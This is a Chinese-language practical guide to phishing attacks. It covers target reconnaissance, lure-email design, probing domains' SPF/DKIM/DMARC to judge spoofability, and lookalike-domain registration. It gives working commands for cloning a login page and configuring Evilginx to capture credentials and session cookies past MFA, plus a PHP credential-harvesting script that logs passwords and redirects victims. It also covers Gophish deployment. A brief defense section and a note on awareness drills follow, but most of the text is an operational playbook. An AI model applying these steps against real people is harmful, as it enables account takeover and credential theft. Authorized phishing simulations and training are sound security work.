# 社工钓鱼技术实战指南

---

## 📋 目录

1. [社工攻击概述](#一社工攻击概述)
2. [钓鱼邮件制作](#二钓鱼邮件)
3. [邮件伪造技术](#三邮件伪造)
4. [钓鱼网站搭建](#四钓鱼网站)
5. [Gophish 平台实战](#五gophish平台)
6. [成功案例与防御](#六防御)

---

## 一、社工攻击概述

```
社会工程 = 利用人的心理弱点而非技术漏洞

社工攻击三角:
  ✓ 权威感 — 假扮领导/IT/公安
  ✓ 紧迫感 — "账户即将被冻结" "24小时内必须处理"
  ✓ 社交证明 — 伪造同事推荐/群聊/内部通知

常见社工类型:
  ✦ 钓鱼邮件 (Phishing) — 最常见的入口
  ✦ 鱼叉钓鱼 (Spear Phishing) — 精准目标,定制邮件
  ✦ 电话钓鱼 (Vishing) — 假冒IT/客服
  ✦ 短信钓鱼 (Smishing) — 假冒快递/银行
  ✦ USB丢包 — 丢弃含恶意文件的U盘
  ✦ 尾随进门 — 跟着员工进入门禁区
```

---

## 二、钓鱼邮件

### 2.1 邮件模板设计

```
高效钓鱼邮件要素:

① 可信发件人
   [CEO名字]、[IT部门]、[HR部门]、[客户名称]
   使用真实部门 + 真实人名

② 合理主题
   "紧急: VPN密码重置通知"
   "[公司名] 2026年薪资调整确认"
   "关于昨天会议的文件补充"
   "Notice: Your mailbox is almost full"

③ 自然正文
   - 模仿公司内部邮件的语气和格式
   - 使用真实的签名模板
   - 提到真实的项目/事件/人名

④ 有效诱导
   - "请立即点击链接重置密码"
   - "请下载附件查看会议纪要"
   - "请回复此邮件确认收到"
```

### 2.2 素材收集

```
社工前信息收集:

目标企业:
  ✦ 官网 → 组织架构/领导名字/产品/事件
  ✦ LinkedIn → 员工名单/职位/工作内容
  ✦ 招聘网站 → 使用的技术/系统/流程
  ✦ 工商信息 → 法人/注册信息
  ✦ 微信公众号 → 内部活动/通知格式

邮件格式:
  ✦ 收到过真实邮件 → 分析:
    - 签名格式
    - 称呼习惯
    - 邮件客户端特征
    - 发件域名和发件服务器
```

---

## 三、邮件伪造

### 3.1 SPF/DKIM/DMARC 检测

```bash
# 检查目标域名的邮件安全配置
# SPF 检查
dig TXT example.com | grep spf

# DKIM 检查
dig TXT default._domainkey.example.com

# DMARC 检查
dig TXT _dmarc.example.com

# 评估:
# DMARC policy = none → 邮件可被伪造!
# DMARC policy = reject → 较难伪造
# SPF -all → 只能从SPF允许的IP发信
# SPF ~all/?all → 宽松,可尝试伪造
```

### 3.2 相似域名注册

```
域名欺骗技巧:

字符替换:
  example.com → examp1e.com (l→1)
  example.com → exampie.com (l→i)
  example.com → exarnple.com (m→rn)

前缀/后缀:
  example.com → mail-example.com
  example.com → example-secure.com

使用工具:
  dnstwist example.com → 自动生成相似域名列表
```

---

## 四、钓鱼网站

### 4.1 克隆目标网站

```bash
# 使用 SingleFile 或 wget 克隆
wget -r -l 2 -p -k https://mail.example.com/login

# 修改:
# ① 表单提交地址 → 自己的服务器
# ② 隐藏克隆痕迹
# ③ 添加数据收集逻辑

# 使用 Evilginx — 反向代理钓鱼(可过MFA)
git clone https://github.com/kgretzky/evilginx2
cd evilginx2 && make && ./bin/evilginx

# 配置:
config domain phishing-example.com
config ip 1.2.3.4
phishlets hostname o365 phishing-example.com
phishlets enable o365
lures create o365
lures get-url 0
# 生成钓鱼链接 → 受害者访问 → 实时捕获凭据+Session Cookie
```

### 4.2 凭据收集

```php
// login.php — 收集凭据后跳转
<?php
// 记录凭据
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];

file_put_contents('creds.txt', 
    date('Y-m-d H:i:s') . " | $ip | $username | $password | $ua\n",
    FILE_APPEND);

// 跳转到真实登录页(降低怀疑)
header('Location: https://mail.example.com/login?retry=1');
?>
```

---

## 五、Gophish 平台

```bash
# 部署
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
chmod +x gophish && ./gophish

# 管理端: https://localhost:3333
# (首次登录需改密码)

# 配置四步:
# ① Sending Profiles → SMTP配置
# ② Landing Pages → 钓鱼页面(导入/克隆)
# ③ Email Templates → 邮件模板
# ④ Users & Groups → 目标邮箱列表

# 启动Campaign:
# → 实时查看: 谁打开了邮件? 谁点击了链接? 谁输入了凭据?
```

---

## 六、防御

```
个人防御:
  ✦ 核对发件人邮箱完整地址(不是显示名!)
  ✦ 悬停链接查看真实URL
  ✦ 可疑邮件通过独立渠道(电话/当面)确认
  ✦ 不轻易打开附件
  ✦ 使用密码管理器(不会在钓鱼站输入密码)

企业防御:
  ✓ DMARC策略设为reject
  ✓ SPF严格(-all)
  ✓ DKIM签名
  ✓ 邮件网关+AI钓鱼检测
  ✓ SPF/DKIM/DMARC 完全配置
  ✓ 安全意识培训(季度钓鱼测试)
  ✓ 浏览器隔离策略(远程渲染)
```

---

## ✅ Checklist

- [ ] 信息收集(组织/人员/邮件格式)
- [ ] 邮件模板设计
- [ ] 相似域名注册
- [ ] 钓鱼网站克隆
- [ ] Gophish 配置
- [ ] 钓鱼演练 → 统计 → 培训
